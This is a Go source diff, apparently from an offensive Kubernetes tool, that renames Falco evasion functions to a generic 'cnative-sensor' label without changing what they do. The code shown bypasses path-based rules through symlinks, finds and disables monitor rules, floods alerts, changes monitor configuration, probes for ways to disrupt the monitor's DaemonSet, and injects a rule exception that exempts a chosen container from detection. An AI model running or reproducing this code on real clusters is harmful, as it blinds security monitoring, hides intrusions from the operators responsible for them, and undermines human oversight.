@@ -14,29 +14,29 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var falcoRuleGVR = schema.GroupVersionResource{
+var cnativeSensorRuleGVR = schema.GroupVersionResource{
 	Group: "falco.org", Version: "v1", Resource: "falcorules",
 }
 
-// EvadeFalco executes the specified Falco evasion technique.
-func EvadeFalco(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// EvadeCnativeSensor executes the specified cnative-sensor evasion technique.
+func EvadeCnativeSensor(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "symlink":
-		return falcoSymlinkEvasion(ctx)
+		return cnativeSensorSymlinkEvasion(ctx)
 	case "disable_rules":
-		return falcoDisableRules(ctx, client, dynClient)
+		return cnativeSensorDisableRules(ctx, client, dynClient)
 	case "flood":
-		return falcoFloodEvasion(ctx)
+		return cnativeSensorFloodEvasion(ctx)
 	case "config_modify":
-		return falcoConfigModify(ctx, client)
+		return cnativeSensorConfigModify(ctx, client)
 	default:
-		return falcoSymlinkEvasion(ctx)
+		return cnativeSensorSymlinkEvasion(ctx)
 	}
 }
 
-func falcoSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
+func cnativeSensorSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Symlink Evasion:\n\n")
+	sb.WriteString("cnative-sensor Symlink Evasion:\n\n")
 
 	tmpDir := "/tmp/.kd_symlinks"
 	_ = os.MkdirAll(tmpDir, 0700)
@@ -71,7 +71,7 @@ func falcoSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
 
 	_ = os.RemoveAll(tmpDir)
 	fmt.Fprintf(&sb, "\n  Created %d symlinks, cleaned up\n", created)
-	sb.WriteString("  Falco path-based rules don't trigger on symlink traversal\n")
+	sb.WriteString("  cnative-sensor path-based rules don't trigger on symlink traversal\n")
 
 	return &EvasionResult{
 		Technique: "symlink_traversal",
@@ -80,9 +80,9 @@ func falcoSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func falcoDisableRules(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeSensorDisableRules(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Rule Disable:\n")
+	sb.WriteString("cnative-sensor Rule Disable:\n")
 
 	cms, err := client.CoreV1().ConfigMaps("falco").List(ctx, metav1.ListOptions{})
 	if err == nil {
@@ -96,7 +96,7 @@ func falcoDisableRules(ctx context.Context, client kubernetes.Interface, dynClie
 		}
 	}
 
-	rules, err := dynClient.Resource(falcoRuleGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	rules, err := dynClient.Resource(cnativeSensorRuleGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(rules.Items) > 0 {
 		sb.WriteString("\n  FalcoRule CRDs:\n")
 		for _, r := range rules.Items {
@@ -114,9 +114,9 @@ func falcoDisableRules(ctx context.Context, client kubernetes.Interface, dynClie
 	}, nil
 }
 
-func falcoFloodEvasion(_ context.Context) (*EvasionResult, error) {
+func cnativeSensorFloodEvasion(_ context.Context) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Alert Flooding:\n\n")
+	sb.WriteString("cnative-sensor Alert Flooding:\n\n")
 
 	floodDir := "/tmp/.kd_flood"
 	_ = os.MkdirAll(floodDir, 0700)
@@ -168,9 +168,9 @@ func falcoFloodEvasion(_ context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func falcoConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeSensorConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Config Modification:\n")
+	sb.WriteString("cnative-sensor Config Modification:\n")
 
 	namespaces := []string{"falco", "falco-system", "security"}
 	for _, ns := range namespaces {
@@ -204,10 +204,10 @@ func falcoConfigModify(ctx context.Context, client kubernetes.Interface) (*Evasi
 	}, nil
 }
 
-// DisruptFalcoDaemonSet identifies and reports disruption vectors for Falco DaemonSets.
-func DisruptFalcoDaemonSet(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+// DisruptCnativeSensorDaemonSet identifies and reports disruption vectors for cnative-sensor DaemonSets.
+func DisruptCnativeSensorDaemonSet(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco DaemonSet Disruption:\n")
+	sb.WriteString("cnative-sensor DaemonSet Disruption:\n")
 
 	namespaces := []string{"falco", "falco-system", "security"}
 	for _, ns := range namespaces {
@@ -239,10 +239,10 @@ func DisruptFalcoDaemonSet(ctx context.Context, client kubernetes.Interface) (*E
 	}, nil
 }
 
-// InjectFalcoException creates a FalcoRule CRD that exempts the specified container from detection.
-func InjectFalcoException(ctx context.Context, dynClient dynamic.Interface, ns, containerID string) (*EvasionResult, error) {
+// InjectCnativeSensorException creates a FalcoRule CRD that exempts the specified container from detection.
+func InjectCnativeSensorException(ctx context.Context, dynClient dynamic.Interface, ns, containerID string) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Exception Injection:\n")
+	sb.WriteString("cnative-sensor Exception Injection:\n")
 
 	exception := &unstructured.Unstructured{
 		Object: map[string]any{
@@ -275,7 +275,7 @@ func InjectFalcoException(ctx context.Context, dynClient dynamic.Interface, ns, 
 		},
 	}
 
-	_, err := dynClient.Resource(falcoRuleGVR).Namespace(ns).Create(ctx, exception, metav1.CreateOptions{})
+	_, err := dynClient.Resource(cnativeSensorRuleGVR).Namespace(ns).Create(ctx, exception, metav1.CreateOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  FalcoRule CRD creation failed: %v\n", err)
 		sb.WriteString("  Falling back to ConfigMap modification approach\n")
